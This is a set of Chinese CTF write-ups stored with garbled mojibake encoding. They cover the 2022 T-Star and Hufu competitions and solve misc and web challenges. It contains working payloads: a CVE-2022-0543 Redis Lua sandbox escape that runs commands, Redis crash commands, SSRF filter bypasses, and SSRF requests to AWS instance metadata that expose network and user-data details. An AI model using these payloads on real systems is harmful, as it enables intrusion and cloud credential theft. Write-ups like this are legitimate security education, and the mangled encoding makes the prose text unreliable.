å¯†è¡ŒåŠ¨å·²ç»äºä»Šå¤© 1ç‚¹8åˆ† å¯åŠ¨ã€‚é¡»çŸ¥ï¼ŒT-Starç‰¹å·¥è¯¡è®¡å¤šç«¯ï¼Œä¸ºé˜²ä»–ä»¬ä»ä¸­ä½œæ¢—ï¼Œæˆ‘å·²å°†KEYè¿›è¡ŒHASHå¤„ç†ï¼Œåˆ†åˆ«äº¤ç”±ä¸åŒçš„äººä¿ç®¡ã€‚ä»¥ä»–ä»¬çš„ç®—åŠ›ï¼Œåº”è¯¥å¾ˆéš¾ç ´è§£ã€‚ç±³ç‰¹å°¼å…‹æ›¾ç»å†™é“ï¼Œäººçš„å› ç´ æ˜¯å®‰å…¨è¿‡ç¨‹ä¸­æœ€è–„å¼±çš„ç¯èŠ‚ã€‚å„ä½åŠ¡å¿…æé«˜è­¦æƒ•ï¼Œä¸¥åŠ ä¿å¯†ã€å¦¥å–„å‚¨å­˜ã€‚ è¿™å°é‚®ä»¶éå¸¸é‡è¦ï¼Œå…³é”®æ—¶åˆ»å°†å‘æŒ¥å·¨å¤§ä½œç”¨ï¼Œå¥½æˆåœ¨å³ï¼Œå„ä½æ‹­ç›®ä»¥å¾…ã€‚ Key Hashes Part 1: https://pastebin.com/QZ7QBmmd NightBaron Address: Soldier Island Github: nightBaron042 IF YOU'RE LOOKING, YOU WON'T FIND IT åŒç†ï¼Œæ‹¿åˆ°å¦å¤–ä¸¤éƒ¨åˆ† hashã€‚ Key Hashes Part 2: https://pastebin.com/TUNVRVvk Key Hashes Part 3: https://pastebin.com/rTqtad96 éº»äº†ï¼Œæ˜¯ä¸€å † hashã€‚ ç„äº†çœ¼ GitHub https://github.com/nightbaron042 ï¼Œå‘ç°æ²¡å•¥ç”¨ï¼Œå¥½åƒè¿˜æ˜¯å»å¹´ç•™ä¸‹çš„ï¼Ÿ æ²¡åŠæ³•ï¼Œæ‹¿å» somd5 å’Œ cmd5 æ°ªé‡‘æœäº†ä¸‹ï¼Œè§£å¾—äº†éƒ¨åˆ†æ˜æ–‡ã€‚ å¯»æ€ç€æ˜¯ä¸æ˜¯æ¯ä¸ªä½œä¸ºä¸€ä¸ª key å½“æˆå­—å…¸å‘è¿‡å»ï¼Ÿ å†™äº†ä¸ªè„šæœ¬è¯•è¯•ã€‚ import requests from urllib.parse import quote with open('parts.txt', 'r', encoding='utf-8') as f: d = f.read() l = d.split('\\n') print(len(l)) for k in l: data = { \"key\": quote(k) } h = {\"Content-Type\": 'application/x-www-form-urlencoded'} r = requests.post('http://159.75.190.64/', data=data, headers=h) if 'keyé”™è¯¯' in r.text: print(k, 'error') else: print('!!!!!!!!!!!!!!!!!!', k, 'ok') print(r.text) break å¯æƒœä¸æ˜¯ã€‚ åˆçœ‹äº†çœ‹è¿™æ„Ÿè§‰åƒä¸€æ®µè¯å•Šï¼Œæ‹¼èµ·æ¥å¾—åˆ° print(''.join(l)) # Securit is too often merely anion,ionmes made even worsebility, naivete, orance come into play. The mostctedtist of the twentieth Albert isquoted as two things areinfinite, the universe and humanstupidity, I'm not sure about Inend, social engineeringattacks can succeed when people stupidor, more commonly, simply ignorant about good security practices. With the same attitude as our security-conscious many information technology (IT) professionals hold to the misconception that made their companies largely immune to attack because deployed standard security products - firewalls, intrusion detection or stronger authentication devices such as time-based tokens or biometric smart cards. Anyone who thinks å’•å’•å™œåŠ ä¸Šå¼•å·å¼ºåˆ¶åŒ¹é…æœäº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°åŸæ–‡äº†ï¼ https://pt.slideshare.net/ragazome/kevin-mitnick-the-art-of-deception?smtNoRedir=1 Kevin Mitnick - The Art of Deception å‡¯æ–‡ç±³ç‰¹å°¼å…‹ã€Šæ¬ºéª—çš„è‰ºæœ¯ã€‹ Security is too often merely an illusion, an illusion sometimes made even worse when gullibility, naivete, or ignorance come into play. The world's most respected scientist of the twentieth century, Albert Einstein, is quoted as saying, \"Only two things are infinite, the universe and human stupidity, and I'm not sure about the former.\" In the end, social engineering attacks can succeed when people are stupid or, more commonly, simply ignorant about good security practices. With the same attitude as our security-conscious homeowner, many information technology (IT) professionals hold to the misconception that they've made their companies largely immune to attack because they've deployed standard security products - firewalls, intrusion detection systems, or stronger authentication devices such as time-based tokens or biometric smart cards. Anyone who thinks that security products alone offer true security is settling for. the illusion of security. It's a case of living in a world of fantasy: They will inevitably, later if not sooner, suffer a security incident. å¦å¤–ï¼Œçœ‹äº†å®˜æ–¹ wp æ‰çŸ¥é“åŸæ¥é‚®ä»¶é‡Œçš„ 1ç‚¹8åˆ† æ˜¯è¯´ç¬¬ä¸€ç« çš„ç¬¬8æ®µã€‚ã€‚ æŠŠè¿™æ®µè¯å¤åˆ¶ä¸€ä¸‹ï¼Œå½“æˆ key æ‹¿å»æäº¤ï¼Œå¾—åˆ° flagã€‚ keyæ­£ç¡®ï¼Œæ­å–œæ¢å¤ç”µè„‘ï¼Œå¿«å»æäº¤flagå§ï¼šflag{ski931iwasjudqwkashajdsakdhadjshakdhsahkd} ï¼ˆéº»äº†ï¼Œå…¶å®äº‹å®ä¸Šæ²¡å¿…è¦èŠ±è´¹é‚£ä¹ˆå¤šæ¬¡æ•°æ¥è§£ md5ï¼Œç›´æ¥æœå‰å‡ ä¸ªè¯å°±è¡Œ Reference &amp; Extended Reading golangçš„ä¸€äº›å®‰å…¨é—®é¢˜ èµ›é¢˜å…­ æ¢å¤æ–‡æ¡£ å€ŸåŠ©ç½‘ç«™çš„å¸®åŠ©ï¼Œä½ ç»ˆäºæˆåŠŸæ¢å¤äº†ç”µè„‘ã€‚ ä½†â€¦â€¦è¿™ä¸ªæ–‡æ¡£ï¼Ÿè¿™ä¸ªæ–‡æ¡£é‡Œåˆæ˜¯ä»€ä¹ˆï¼Ÿ è¿™ä¸€åˆ‡éƒ½æ˜¯æŸä¸ªäººä¸æ€€å¥½æ„çš„ç©ç¬‘å—ï¼Ÿ http://175.178.148.197/0615giqrzc8ab524761/guess æç¤ºï¼šåŒ…å«å¤šä¸ªå°å…³å¡ï¼Œè¯·æäº¤æœ€åä¸€å…³flagï¼Œflagä¸ºT-Star{å­—ç¬¦ä¸²}ä¸­çš„å­—ç¬¦ä¸². 010editor ç„ä¸€çœ¼æ–‡ä»¶ï¼Œå—¯ç†Ÿæ‚‰çš„ wordï¼Œéšæ‰‹æ”¹åç¼€åä¸º .docx ï¼ˆè¿™é‡Œçš„ flag2 æ˜¯éšè—æ–‡å­—ã€‚ å–œæ¬¢æˆ‘ç»™ä½ çš„æƒŠå–œå—ï¼Ÿ æˆ‘å·²å°†çº¿ç´¢è—åˆ°ä¸‰ä¸ªä¸åŒçš„åœ°æ–¹ï¼Œ å…¶ä¸­ä¸€ä¸ªæç¤ºä¸º123456 æ¥æ‰¾æˆ‘å§ï¼Œ è®°ä½ï¼Œä½ åªèƒ½ä¸€ä¸ªäººæ¥ å¦åˆ™ï¼Œä½ ä¼šå—åˆ°æƒ©ç½šå“¦ Flag2 : 772e91/webs åé¢è¿˜æœ‰ä¸€å¼ å›¾ã€‚ docx å½“æˆå‹ç¼©åŒ…æ‰“å¼€ï¼Œåœ¨ word/document.xml é‡Œçœ‹åˆ°äº†ä¸€ä¸²å¥‡æ€ªçš„å­—ç¬¦ã€‚ çœ‹èµ·æ¥è®¾ç½®äº†ä¸€ä¸ªä¹¦ç­¾ï¼Œåç§°ä¸º GE3TKLRRG44C4MJUHAXDCOJXã€‚ base32 decodeï¼Œå¾—åˆ° 175.178.148.197ï¼ˆæ€ä¹ˆè¿˜æ˜¯è¿™ä¸ª IPâ€¦â€¦ ä¸‹é¢å›¾ç‰‡çš„æè¿°æç¤ºäº† å±å¹•ä¸Šæœ‰å­—&amp;#xA;&amp;#xA;æè¿°å·²è‡ªåŠ¨ç”Ÿæˆï¼Œæ„Ÿè§‰æ²¡å•¥ç”¨ï¼Œåº”è¯¥æ˜¯ word è‡ªåŠ¨ç”Ÿæˆçš„æè¿°å§ï¼ˆ å†çœ‹å›¾ç‰‡ï¼Œç†Ÿç»ƒåœ°ä»docxå‹ç¼©åŒ…é‡Œæå–å‡ºæ¥ï¼Œç„¶åè¯•äº†å„ç§éšå†™å·¥å…·ï¼Œæœ€åå‘ç°æ˜¯ outguessã€‚ã€‚ï¼ˆå™¢æˆ‘æ²¡æ³¨æ„çœ‹ docx åå­— $ outguess -r -k \"123456\" image1.jpg data.bin Reading image1.jpg.... Extracting usable bits: 88951 bits Steg retrieve: seed: 109, len: 15 å¾—åˆ° /062ycz7s9458b æ‹¼æ¥ä¸€ä¸‹ï¼Œ175.178.148.197/772e91/webs/062ycz7s9458b http://175.178.148.197/062ycz7s9458b772e91/webs/ å¯æ¶çš„å¥—å¨ƒï¼Œæ˜¯ SSRF å•Šã€‚é‚£ä¹ˆ flag åœ¨å“ªå‘¢ï¼Ÿ è¯•äº†ä¸‹ file åè®®å‘ç°ä¸è¡Œã€‚ éšæ‰‹è¯•äº†ä¸‹ http://175.178.148.197/062ycz7s9458b772e91/webs/flag.php é‚£å°±æ‹¿ SSRF è®¿é—®è¿™ç©æ„å¥½äº†ã€‚ ban äº† 127.0.0.1ï¼Œæ‹¿ 0.0.0.0 ç»•è¿‡å°±è¡Œã€‚ï¼ˆå‘ç° [::] ä¸è¡Œ 2333 æˆ–è€…ç”¨ 127.0.0.2 ä¹Ÿè¡Œã€‚ http://175.178.148.197/062ycz7s9458b772e91/webs/?url=http://0.0.0.0/062ycz7s9458b772e91/webs/flag.php T-STAR{ThereAreNoBoundaries} å°ç»“æ‘¸äº†ï¼Œç»ˆäº AK äº†ï¼Œå’±ç¬¬17åâ€¦â€¦ æ€ä¹ˆè¯´å‘¢ï¼Œæ„Ÿè§‰æ€»ä½“ä¸Šé¢˜ç›®åå‘ CTF æ¯”èµ›ä¸­çš„ Misc å’Œ Webï¼Œè´¨é‡è¿˜æ˜¯è¯´å¾—è¿‡å»çš„ï¼Œè¿˜æ˜¯æ¯”è¾ƒæœ‰è¶£çš„ï¼Œç›¸å¯¹äº æŸ src å¼€å±•çš„æ´»åŠ¨è´¨é‡é«˜ä¸å°‘ï¼Œhhh è™½ç„¶æ„Ÿè§‰é¢˜ç›®æŒºå¥—å¨ƒçš„å°±æ˜¯äº†â€¦â€¦ä»¥åŠæœ€è®©å’±è„‘æ´çš„å±…ç„¶æ˜¯ç¬¬ä¸€é¢˜é‚£ä¸ª XXEï¼Œ100åˆ†çš„é¢˜ç›®å±…ç„¶è¿™ä¹ˆéš¾æƒ³åˆ°ï¼Œè€Œç¬¬äºŒé¢˜éšä¾¿çŒœå°±èƒ½çŒœåˆ°ï¼ŒæŒºç¦»è°±çš„ã€‚ å¦å¤–ï¼Œå¥½å¤šä¸ªé¢˜ç›®éƒ½ç”¨äº†åŒä¸€ä¸ªé¶æœºï¼Œç›¸å½“äº flag çš„ç¬¬ä¸€éƒ¨åˆ†ç­‰äºç™½é€äº†ï¼Œä¹Ÿæ­£å› ä¸ºå¦‚æ­¤ï¼Œå‰å‡ å¤©çš„æ—¶å€™æœåŠ¡å™¨å·¨å¡ï¼Œç¬¬ä¸€é¢˜è™½ç„¶è¯´äº†ä¸è¦ç”¨æ‰«æå™¨ï¼Œä½†è¿˜æ˜¯ä¸€å †äººåŒæ—¶è®¿é—®ï¼Œè‚¯å®šä¹Ÿæœ‰äººåœ¨æ‰«ï¼Œæ²¡åŠæ³•æ›´åŠ å¡äº†ã€‚ ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¸»åŠæ–¹ç»è´¹æœ‰é™çš„åŸå› ï¼Œåæ­£å»ºè®®ä¸‹æ¬¡å¯ä»¥çš„è¯æ¯ä¸ªé¢˜å¤šè®¾ç½®å‡ å°é¶æœºï¼Œåšé¢˜ä½“éªŒè¿˜æ˜¯æ¯”è¾ƒé‡è¦çš„ã€‚ ä¸ç®¡æ€ä¹ˆè¯´ï¼Œå¤šå¤šå°‘å°‘è¿˜æ˜¯å­¦åˆ°äº†ç‚¹çŸ¥è¯†çš„ï¼Œé‚£å°±å†™åˆ°è¿™é‡Œå§ã€‚ å®˜æ–¹ writeup ä¹Ÿå‡ºæ¥äº†ï¼š ã€å®˜æ–¹é¢˜è§£ã€‘è…¾è®¯ç½‘ç»œå®‰å…¨T-Staré«˜æ ¡æŒ‘æˆ˜èµ›write up åŒæ—¶ï¼Œä¹Ÿæ¬¢è¿å¸ˆå‚…ä»¬æ¥ã€ŒFunny Web CTFã€å’Œæœ‹å‹ä»¬è®¨è®ºæœ‰è¶£çš„è¯é¢˜çš„å–µ~ https://t.zsxq.com/7y7iAuf ï¼ˆæºœäº†æºœäº†å–µ~","path":"2022/04/26/CTF_2022T-Star/"},{"title":"CTF | 2022 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ åˆèµ› WriteUp","text":"å¼•è¨€ 2022æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ - åˆèµ› æ¯”èµ›æ—¶é—´: 2022-03-19 09:00 ~ 2022-03-20 17:00 æ¯”èµ›å®˜ç½‘: https://www.qianxin.com/DCICHF/2022 ä¸Šä¸ªå‘¨æœ«æ‰“äº†ä¸‹è™ç¬¦ CTFï¼Œæ„Ÿè§‰é¢˜ç›®æ€»ä½“è€Œè¨€éš¾åº¦æŒºå¤§ï¼Œå¾ˆå¤šé¢˜ç›®æœ€åè§£é¢˜æ•°è¿˜æ˜¯ä¸ªä½æ•°ã€‚ ä¹Ÿå°± Misc æ–¹å‘ç›¸å¯¹æ¥è¯´ç®€å•ä¸€ç‚¹äº†ï¼Œäºæ˜¯æ¥ç©äº†ç©ï¼Œç®€å•å†™ä¸€ä¸‹ writeup å§ã€‚ é¡ºä¾¿å¯ä»¥å›é¡¾ä¸€ä¸‹å»å¹´çš„ï¼š CTF | 2021 æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›è™ç¬¦ç½‘ç»œå®‰å…¨èµ›é“ WriteUp MiscPlain Text ZE9CUk8gUE9WQUxPV0FUWCBOQSBNQVReLCBXWSBET0xWTlkgUEVSRVdFU1RJIFxUTyBOQSBBTkdMSUpTS0lKIFFaWUsuIHRXT0ogU0VLUkVUIFNPU1RPSVQgSVogRFdVSCBTTE9XLiB3U0UgQlVLV1kgU1RST15OWUUuIHFCTE9eTllKIEFSQlVaLiB2RUxBRU0gV0FNIE9UTEleTk9HTyBETlEu Flagæ ¼å¼ HFCTF{[a-z_]+}ï¼Œå¦‚æœ‰ç©ºæ ¼ä½¿ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ base64 dOBRO POVALOWATX NA MAT^, WY DOLVNY PEREWESTI \\TO NA ANGLIJSKIJ QZYK. tWOJ SEKRET SOSTOIT IZ DWUH SLOW. wSE BUKWY STRO^NYE. qBLO^NYJ ARBUZ. vELAEM WAM OTLI^NOGO DNQ. ç„¶åä¸¢å»å’•å’•å™œç¿»è¯‘ï¼Œæ£€æµ‹åˆ°æ³¢å…°è¯­ï¼Ÿï¼Ÿï¼Ÿä½†æ˜¯ç¿»è¯‘åˆä¸å…¨ã€‚ æŸ¥äº†ä¸‹ SOSTOITï¼Œè¿™æ˜¯ä¿„è¯­ï¼Ÿ ä¸€å¥ä¸€å¥ç¿»è¯‘ï¼Œå‘ç°åŸæ¥çœŸæ˜¯ä¿„è¯­å•Šâ€¦â€¦å¤ªæŠ½è±¡å•¦ã€‚ good POVALOVATCH ON MOTHER ^ YOU MUST TRANSLATE THIS INTO ENGLISH. your SECRET IS TWO WORDS. all LETTERS are STRUCTURED. APPLE ^ WATERMELON. WISHING YOU A GREAT DAY. éº»äº†ï¼Œå‘ç°åŸæ¥æœ€å flag å°±æ˜¯è¿™ä¸¤ä¸ªå•è¯ã€‚ã€‚æ ¹æ®é¢˜ç›®æ ¼å¼æ‹¼å‡º flagã€‚ HFCTF{apple_watermelon} çœ‹äº†å®˜æ–¹ wp æ‰çŸ¥é“è¿™ä¸ªæ˜¯ KOI8-R ç¼–ç ã€‚è€Œä¸” æœ€â¾¼ä½bitè¢«é”™è¯¯ç½®0 äº†ã€‚ KOI8-Ræ˜¯KOI-8ç³»åˆ—çš„æ–¯æ‹‰å¤«æ–‡å­—8ä½å…ƒç¼–ç ï¼Œä¾›ä¿„è¯­åŠä¿åŠ åˆ©äºšè¯­ä½¿ç”¨ã€‚åœ¨Unicodeæœªæµè¡Œä¹‹å‰ï¼ŒKOI8-R æ˜¯æœ€ä¸ºå¹¿æ³›ä½¿ç”¨çš„ä¿„è¯­ç¼–ç ï¼Œä½¿ç”¨ç‡ç”šè‡³æ¯”ISO/IEC 8859-5è¿˜é«˜ã€‚ via https://zh.wikipedia.org/wiki/KOI8-R print(bytearray([x+128 for x in base64.b64decode('ZE9CUk8gUE9WQUxPV0FUWCBOQSBNQVReLCBXWSBET0xWTlkgUEVSRVdFU1RJIFxUTyBOQSBBTkdMSUpTS0lKIFFaWUsuIHRXT0ogU0VLUkVUIFNPU1RPSVQgSVogRFdVSCBTTE9XLiB3U0UgQlVLV1kgU1RST15OWUUuIHFCTE9eTllKIEFSQlVaLiB2RUxBRU0gV0FNIE9UTEleTk9HTyBETlEu')]).decode('koi8-r')) # Ğ”Ğ¾Ğ±Ñ€Ğ¾â•Ğ¿Ğ¾Ğ¶Ğ°Ğ»Ğ¾Ğ²Ğ°Ñ‚ÑŒâ•Ğ½Ğ°â•Ğ¼Ğ°Ñ‚Ñ‡â•›â•Ğ²Ñ‹â•Ğ´Ğ¾Ğ»Ğ¶Ğ½Ñ‹â•Ğ¿ĞµÑ€ĞµĞ²ĞµÑÑ‚Ğ¸â•ÑÑ‚Ğ¾â•Ğ½Ğ°â•Ğ°Ğ½Ğ³Ğ»Ğ¸Ğ¹ÑĞºĞ¸Ğ¹â•Ñ Ğ·Ñ‹Ğºâ•â•Ğ¢Ğ²Ğ¾Ğ¹â•ÑĞµĞºÑ€ĞµÑ‚â•ÑĞ¾ÑÑ‚Ğ¾Ğ¸Ñ‚â•Ğ¸Ğ·â•Ğ´Ğ²ÑƒÑ…â•ÑĞ»Ğ¾Ğ²â•â•Ğ’ÑĞµâ•Ğ±ÑƒĞºĞ²Ñ‹â•ÑÑ‚Ñ€Ğ¾Ñ‡Ğ½Ñ‹Ğµâ•â•Ğ¯Ğ±Ğ»Ğ¾Ñ‡Ğ½Ñ‹ Ğ¹â•Ğ°Ñ€Ğ±ÑƒĞ·â•â•Ğ–ĞµĞ»Ğ°ĞµĞ¼â•Ğ²Ğ°Ğ¼â•Ğ¾Ñ‚Ğ»Ğ¸Ñ‡Ğ½Ğ¾Ğ³Ğ¾â•Ğ´Ğ½Ñâ• å†æ‹¿å»ç¿»è¯‘ï¼Œç»“æœå°±å¾ˆæ˜æ˜¾äº† Quest-CrashæŒ‰ç…§é¢˜ç›®æ„æ€ï¼Œredis æ‰“å´©è€Œå¤–é¢çš„ flask ä¸å´©å°±å®Œäº‹ã€‚ æ‹¿ burpsuite å¼€ä¸ªå¤šçº¿ç¨‹ç–¯ç‹‚å¾€ redis é‡Œå†™æ•°æ® SET xxx yyy ï¼Œå¹¶å‘é‡ç¨å¾®å¤§ä¸€ç‚¹ï¼Œè·‘ä¸€ä¼šå„¿ï¼Œå†å‘åŒ… GETFLAG å°±å‡ºæ¥äº†ã€‚ ï¼ˆå’±åˆšå¼€å§‹å¹¶å‘é‡å¤§äº†ç”šè‡³æŠŠ flask æ‰“å´©äº†ï¼Œè¿˜å»é‡ç½®äº†ä¸‹ï¼Œ2333 æ ¹æ®å®˜æ–¹ wpï¼Œæ˜¯ https://github.com/redis/redis/issues/2855 è¿™ä¸ªé—®é¢˜ï¼Œå’±éé¢„æœŸäº† 233. PoC: GET aa\\nEVAL \"struct.pack('&gt;I2147483648', '10')\" 0å…¶ä»–è§£æ³•ï¼š GET a\\nDEBUG SEGFAULT Quest-RCERedis RCEï¼Œè¿˜æ˜¯æœ€æ–°å‡ºçš„é‚£ä¸ª CVE-2022-0543 å‚è€ƒ https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md è¿™é‡Œé¢çš„ payload å€ŸåŠ©Luaæ²™ç®±ä¸­é—ç•™çš„å˜é‡packageçš„loadlibå‡½æ•°æ¥åŠ è½½åŠ¨æ€é“¾æ¥åº“/usr/lib/x86_64-linux-gnu/liblua5.1.so.0é‡Œçš„å¯¼å‡ºå‡½æ•°luaopen_ioã€‚åœ¨Luaä¸­æ‰§è¡Œè¿™ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œå³å¯è·å¾—ioåº“ï¼Œå†ä½¿ç”¨å…¶æ‰§è¡Œå‘½ä»¤ã€‚ eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 ï¼ˆå‘ç°è¿™ä¸ªæ¼æ´çš„äººä¹Ÿå¤ªç‰›äº†ï¼Œå¯ä»¥æ‹¿ expå»æ—¥æœºå™¨äº†ï¼Œå¥½è€¶ ç”¨ \\r\\n æ‹¼æ¥ä¸€ä¸‹è¯­å¥ç»•è¿‡ä»–çš„ whitelist é™åˆ¶å°±å¥½äº†ã€‚ Exp: POST /sendreq HTTP/1.1 Host: 120.25.155.106:32811 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://120.25.155.106:32811/ Content-Type: application/json Origin: http://120.25.155.106:32811 Content-Length: 267 Connection: close Pragma: no-cache Cache-Control: no-cache {\"query\":\"SET X 123\\r\\neval 'local io_l = package.loadlib(\\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\", \\\"luaopen_io\\\"); local io = io_l(); local f = io.popen(\\\"cat /flag_UVEmnDKY4VHyUVRVj46ZeojgfZpxzG\\\", \\\"r\\\"); local res = f:read(\\\"*a\\\"); f:close(); return res' 0\"} Meta http://54.64.248.8:13512 ï¼ˆè¿™é¢˜æ˜¯èµ›åå¤ç°çš„ çœ‹èµ·æ¥æœ‰ä¸¤å°æœåŠ¡å™¨ï¼Œä¸€ä¸ª web server å’Œä¸€ä¸ª flag serverã€‚ å‰è€… POST /self POST /self HTTP/1.1 Host: 54.64.248.8:13512 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://54.64.248.8:13512/ Content-Type: application/json Origin: http://54.64.248.8:13512 Content-Length: 15 Connection: close Pragma: no-cache Cache-Control: no-cache {\"op\":\"status\"} è€Œåè€…é€šè¿‡ rpc è®¿é—® flag server ä¸Šçš„æœåŠ¡ POST /req_flag_server HTTP/1.1 Host: 54.64.248.8:13512 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://54.64.248.8:13512/ Content-Type: application/json Origin: http://54.64.248.8:13512 Content-Length: 103 Connection: close Pragma: no-cache Cache-Control: no-cache {\"op\":\"statflag\",\"path\":\"/rpc\"} è¿™ä¸ª Listen Address: :: å¾ˆå¯ç–‘ï¼Œè¯´æ˜æ˜¯ç›‘å¬åœ¨ ipv6 ç«¯å£ä¸Šçš„ï¼Œç›´æ¥è®¿é—® 54.64.248.8:14571 ç¡®å®è®¿é—®ä¸åˆ°ã€‚ äºæ˜¯æƒ³ç€æ€ä¹ˆå»æ‰¾ä»–çš„ IPv6 åœ°å€ã€‚ æŸ¥äº†ä¸‹ IPåœ°å€ï¼Œäºšé©¬é€Šäº‘ # dig -x 54.64.248.8 ; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; -x 54.64.248.8 ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 23884 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ;; QUESTION SECTION: ;8.248.64.54.in-addr.arpa. IN PTR ;; ANSWER SECTION: 8.248.64.54.in-addr.arpa. 300 IN PTR ec2-54-64-248-8.ap-northeast-1.compute.amazonaws.com. ... http://ec2-54-64-248-8.ap-northeast-1.compute.amazonaws.com:13512/ ç¡®å®èƒ½è®¿é—®åˆ°è¿™ä¸ªã€‚ åˆæƒ³èµ·æ¥ Amazon æœ‰ä¸ª meta-data çš„ä¸œè¥¿ï¼Œä¹‹å‰çœ‹åˆ°è¿‡æ‹¿æ¥å‡ºé¢˜çš„ï¼Œç¿»äº†ç¿»æ‰¾åˆ°äº† FLAWS challengeâ€”â€”AWS CTFé€šå…³è®° AWS Capture the Flag Write-Up è€Œè¿™ä¸ª rpc çš„ path å¾ˆå¯ç–‘ï¼Œè¯•äº†ä¸‹åˆ©ç”¨ @ å®é™…ä¸Šæ˜¯èƒ½è®¿é—®ä»»æ„åœ°å€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ å­˜åœ¨ Server Side Request Forgery (SSRF) æ¯”å¦‚å¯ä»¥è®¿é—®å’±åšå®¢ï¼ˆ éšä¾¿ nc ç›‘å¬ä¸ªç«¯å£çœ‹çœ‹ POST / HTTP/1.1 Host: 1.2.3.4:12345 User-Agent: python-requests/2.22.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive X-Signature: a00c3f242d5870b5124a65b08690fd3e270f7596e25a3848f1414a6b6c6560f6 X-Sign-Method: HMAC-SHA256 X-Sign-Key-File: /home/ubuntu/.ssh/authorized_keys X-Flag-Server: http://[::1]:14571 Content-Length: 18 Content-Type: application/json Authorization: Basic Wzo6MV06MTQ1NzE= {\"op\": \"statflag\"} æŒ‰ç…§ Amazon æ–‡æ¡£ Retrieve instance metadataï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡ Amazon çš„ link-local addresses æ‹¿åˆ°å®ä¾‹çš„ä¿¡æ¯çš„ã€‚ IPv4 http://169.254.169.254/latest/meta-data/ IPv6 http://[fd00:ec2::254]/latest/meta-data/ äºæ˜¯è·å–ä¸‹å®ä¾‹çš„ IPv6 åœ°å€ @169.254.169.254/latest/meta-data/ipv6 ==&gt; 2406:da14:444:4e00:a393:91b2:27fd:7f3 @169.254.169.254/latest/meta-data/hostname ip-172-26-12-112.ap-northeast-1.compute.internal @169.254.169.254/latest/meta-data/network/interfaces/macs/06:7f:b4:fb:1e:9d/security-groups ps-adhoc-13512(in:0.0.0.0/0)_14571(in:::/0)_22(in:0.0.0.0/0)(in:::/0)_80(in:0.0.0.0/0)(in:::/0) Your Parkside Resources Ingress from Your Parkside LoadBalancers è¿™é‡Œä¹Ÿçœ‹åˆ°äº†å¼€æ”¾çš„ç«¯å£ï¼Œç›´æ¥è®¿é—® IPv6 ä»¥åŠç«¯å£æ˜¯èƒ½è®¿é—®çš„ã€‚ user-data çœ‹èµ·æ¥æ²¡å•¥ç”¨ï¼Ÿ @169.254.169.254/latest/user-data #!/bin/sh echo Lightsail: Starting Instance Initialization. cat &gt; /etc/ssh/lightsail_instance_ca.pub &lt;&lt; EOF ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDKj2y/VZMpMb16dSC0Gtln2Gi2BarD9KMnKwnplLLzXld24JODkQnXlC67ffXZ/mfRmKW1df/MDp8RQLYwbH/jIo4BX4mfs5f59nHlzlT5XjSACvRxEGYWK/h9UHfmcZtklVVkguGG9t7sArFnACzS6oVAzkVT+aowoZ9Wgrmh+Wl9z+J8J4wCX+BnKoip1u42WGDZhTPfKTNzoZJOSv6DW1U4460PKDzyV7UNS4h2VfxHPJyNFZM/sz4+50WBKNFWy7YwcKEEeNpQbLxyUA2AZgSsbQIPYvn/AcQz2aAL9r2FMrICRqy6v9Bf5BZHzZDSMBDdziBSiZiYSpqEMcqkgH8cgJib7zLa4gKZr/Lwe5u2ZzKUAwId0hCnP+67DPWG2nz3nseeR9znR9ipWZTqzerZpotGegH48jofoa6wAmSm0tonQmcY35HWH7gcUlUZUlP9lxj8UKq3YPSQV3GUexYnaulDXhdgWQQQpubUMehHXLIbhMNh+M6j2BmvSpDkZSQRRhY0iD0Fo1txqVxLXPddqmDVhkwk0k/8LxF5nj+YBtvXkdsNLoGgHz9UOhOW2N12OmDbKxWpZ/Uvw7FyLIkG9p0g73lalZcY60wWtJdk7j/svrj1rRfhiQDYqq8hivZSWfJ0NHtM+AkZSNJvUCOFzBtU4r0zlBz37egxvw== EOF echo Lightsail: SSH CA Public Key created. echo &gt;&gt; /etc/ssh/sshd_config echo 'TrustedUserCAKeys /etc/ssh/lightsail_instance_ca.pub' &gt;&gt; /etc/ssh/sshd_config echo Lightsail: SSH CA Public Key registered. version_string=$(ssh -V 2&gt;&amp;1) current_version=$(echo \"$version_string\" | sed 's/.*OpenSSH_//; s/[p\\|,].*//') min_version=\"7.9\" versions=\"$current_version $min_version\" if [ \"$(echo \"$versions\" | sort -Vr | head -n1)\" = \"$current_version\" ]; then echo 'CASignatureAlgorithms +ssh-rsa' &gt;&gt; /etc/ssh/sshd_config 